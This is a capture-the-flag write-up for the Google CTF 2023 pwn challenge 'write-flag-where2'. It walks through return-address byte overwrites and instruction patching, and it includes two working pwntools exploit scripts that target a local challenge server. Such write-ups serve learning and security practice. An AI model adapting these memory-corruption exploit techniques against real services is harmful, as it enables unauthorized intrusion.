# Google CTF 2023 - pwn: write-flag-where2 writeup

In the second version, we can no longer do that, as there is no fluff printed inside the loop.

One idea is to overwrite the return address so that we jump into the child function beginning again, or somewhere near at least… And overwrite one of the strings printed at start.
We have only very little control over the write, we can for example write 'C' (0x43) byte.
Return address is 0x15c9. So we can overwrite it with 0x1543, but that address is in the middle of an instruction and parses as the "in" instruction, which is not useful. We can also overwrite with 'T' (by noticing the retaddr is little-endian) which gives us 0x1554, which is also in the middle of instruction. 'F' would parse as "add [rax], al", and rax is zero at this point. '{' is also not useful. However, '}' would work - it jumps into a "jns" instruction, which either way would print some message, which we can overwrite with the flag. We'll just need to brute force the flag length to know at which offset to write it.

```
from pwn import *

context.log_level = "DEBUG"

r = remote("localhost", 1337)
flaglen = 13

s = r.recvuntil(b"\n\n").decode().splitlines()[2:]
base = None
for line in s:
  if "chal" in line and base is None:
    base = int(line.split("-")[0], 16)
  if "stack" in line:
    stack = int(line.split("-")[1].split()[0], 16)

print(hex(base), hex(stack))

ret = stack - (0x7ffffffff000-0x7fffffffdbd8)
print(hex(ret))
r.sendline(b"0x%x %d" % ((ret-flaglen+1), flaglen))
r.sendline()
r.interactive()
```

Unfortunately the above code, while technically working, only prints the "server accept failed" message on the server console, not to the socket - and then exits immediately. So we need another idea.
We can also overwrite arbitrary code with 'T', which is a relatively harmless 'push rsp', to effectively nop the instruction out. This way we should avoid the unfortunate exit calls? (The first nop will have to be 'CT', or 'push r12', which is also fine!

```
from pwn import *

context.log_level = "DEBUG"

r = remote("localhost", 1337)
flaglen = 13

s = r.recvuntil(b"\n\n").decode().splitlines()[2:]
base = None
for line in s:
  if "chal" in line and base is None:
    base = int(line.split("-")[0], 16)
  if "stack" in line:
    stack = int(line.split("-")[1].split()[0], 16)

print(hex(base), hex(stack))

def nop2(addr):
  r.sendline(b"0x%x 2" % (addr+base))
  sleep(0.1)

nop2(0x15d1)
nop2(0x15d0)
nop2(0x15cf)
nop2(0x15ce)
nop2(0x15cd)
nop2(0x15cc)
nop2(0x15cb)
nop2(0x15ca)
nop2(0x15c9)
r.sendline(b"0x%x 127" % (0x218e+base))
sleep(0.1)
r.sendline()
r.interactive()
```

This script gives us the flag for part 2 of the challenge by avoiding the exit(0) and going into some dprintf call, for which we overwrite the argument with the flag.
